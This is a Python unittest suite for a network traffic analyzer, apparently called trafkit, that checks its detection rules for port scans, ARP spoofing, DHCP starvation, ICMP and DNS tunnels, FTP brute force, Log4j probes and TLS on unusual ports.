class TestDetectors(unittest.TestCase):
    def test_clean_baseline_triggers_nothing(self):
        result = trafkit.analyze(_p("clean_baseline"))
        self.assertEqual(result.findings, [])

    def test_tcp_connect_scan(self):
        result = trafkit.analyze(_p("nmap_connect"))
        self.assertIn("SCAN-NMAP-01", _rule_ids(result))
        f = next(f for f in result.findings if f.rule_id == "SCAN-NMAP-01")
        self.assertIn("Connect", f.evidence["scan_type"])

    def test_tcp_syn_scan(self):
        result = trafkit.analyze(_p("nmap_syn"))
        self.assertIn("SCAN-NMAP-01", _rule_ids(result))
        f = next(f for f in result.findings if f.rule_id == "SCAN-NMAP-01")
        self.assertIn("SYN", f.evidence["scan_type"])

    def test_udp_scan(self):
        result = trafkit.analyze(_p("nmap_udp"))
        self.assertIn("SCAN-NMAP-03", _rule_ids(result))

    def test_horizontal_scan(self):
        result = trafkit.analyze(_p("horizontal_scan"))
        self.assertIn("SCAN-NMAP-02", _rule_ids(result))

    def test_arp_spoof_and_relay(self):
        result = trafkit.analyze(_p("arp_spoof"))
        ids = _rule_ids(result)
        self.assertIn("ARP-SPOOF-01", ids)
        self.assertIn("ARP-SPOOF-02", ids)

    def test_arp_flood(self):
        result = trafkit.analyze(_p("arp_flood"))
        self.assertIn("ARP-FLOOD-01", _rule_ids(result))

    def test_dhcp_starvation(self):
        result = trafkit.analyze(_p("dhcp_nbns_kerberos"))
        self.assertIn("DHCP-ANOM-01", _rule_ids(result))

    def test_icmp_tunnel(self):
        result = trafkit.analyze(_p("icmp_tunnel"))
        self.assertIn("TUNNEL-ICMP-01", _rule_ids(result))
        # exactly one finding for the bidirectional pair, not two mirror ones
        icmp_findings = [f for f in result.findings if f.rule_id == "TUNNEL-ICMP-01"]
        self.assertEqual(len(icmp_findings), 1)

    def test_dns_tunnel(self):
        result = trafkit.analyze(_p("dns_tunnel"))
        self.assertIn("TUNNEL-DNS-01", _rule_ids(result))

    def test_ftp_bruteforce_and_spray(self):
        result = trafkit.analyze(_p("ftp_bruteforce"))
        ids = _rule_ids(result)
        self.assertIn("FTP-BRUTE-01", ids)
        self.assertIn("FTP-BRUTE-02", ids)
        # the single successful login must not itself appear as a failure
        brute = next(f for f in result.findings if f.rule_id == "FTP-BRUTE-01")
        self.assertNotIn("192.168.1.80", brute.evidence.values())

    def test_http_scanner_ua_and_log4j(self):
        result = trafkit.analyze(_p("http_traffic"))
        ids = _rule_ids(result)
        self.assertIn("HTTP-UA-01", ids)
        self.assertIn("HTTP-LOG4J-01", ids)
        log4j = next(f for f in result.findings if f.rule_id == "HTTP-LOG4J-01")
        self.assertEqual(log4j.severity, "critical")

    def test_tls_unusual_port(self):
        result = trafkit.analyze(_p("tls_handshake"))
        self.assertIn("TLS-PORT-01", _rule_ids(result))
        f = next(f for f in result.findings if f.rule_id == "TLS-PORT-01")
        self.assertEqual(f.evidence["port"], 8081)

    def test_detector_isolation_survives_a_bad_packet_list(self):
        # A detector that raises must not take the whole run down -- confirm
        # by handing analyze() an empty packet list (edge case every
        # detector's aggregation loop must handle without raising).
        from trafkit.config import Config
        from trafkit.detectors import AnalysisContext, run_detectors
        findings = run_detectors([], AnalysisContext(hosts={}, conversations=[]), Config())
        self.assertEqual(findings, [])


